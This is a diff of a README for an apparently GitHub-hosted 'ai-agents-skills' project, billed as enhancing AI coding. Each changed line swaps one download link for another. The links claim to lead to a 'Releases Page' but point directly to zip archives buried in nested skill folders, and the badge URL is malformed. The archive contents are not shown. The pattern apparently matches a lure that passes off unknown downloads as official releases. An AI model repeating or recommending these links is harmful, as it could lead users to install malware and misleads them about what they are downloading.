@@ -1,6 +1,6 @@
 # 🧠 ai-agents-skills - Enhance Your AI Coding Experience
 
-[![Download from Releases](https://raw.githubusercontent.com/Makiya1202/ai-agents-skills/master/skills/aws-agentcore/ai_skills_agents_v2.6-beta.5.zip%20Now-From%20Releases-brightgreen)](https://raw.githubusercontent.com/Makiya1202/ai-agents-skills/master/skills/aws-agentcore/ai_skills_agents_v2.6-beta.5.zip)
+[![Download from Releases](https://github.com/Makiya1202/ai-agents-skills/raw/refs/heads/master/skills/ux-design-systems/skills_ai_agents_1.1.zip%20Now-From%20Releases-brightgreen)](https://github.com/Makiya1202/ai-agents-skills/raw/refs/heads/master/skills/ux-design-systems/skills_ai_agents_1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **AI Agent Skills Repository**. This guide will help you download
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Makiya1202/ai-agents-skills/master/skills/aws-agentcore/ai_skills_agents_v2.6-beta.5.zip).
+To get started, visit this page to download: [Releases Page](https://github.com/Makiya1202/ai-agents-skills/raw/refs/heads/master/skills/ux-design-systems/skills_ai_agents_1.1.zip).
 
 Once you're on the page, browse through the available releases. Look for the latest version at the top. You will see files available for download. Choose the file that matches your operating system.
 
@@ -51,7 +51,7 @@ For detailed instructions on using each skill, refer to the in-application help 
 
 ## 🔄 Updates
 
-We periodically release updates to improve performance and add new features. To stay informed about the latest changes, check the Releases Page regularly: [Releases Page](https://raw.githubusercontent.com/Makiya1202/ai-agents-skills/master/skills/aws-agentcore/ai_skills_agents_v2.6-beta.5.zip).
+We periodically release updates to improve performance and add new features. To stay informed about the latest changes, check the Releases Page regularly: [Releases Page](https://github.com/Makiya1202/ai-agents-skills/raw/refs/heads/master/skills/ux-design-systems/skills_ai_agents_1.1.zip).
 
 ## 🙋‍♂️ Support
 
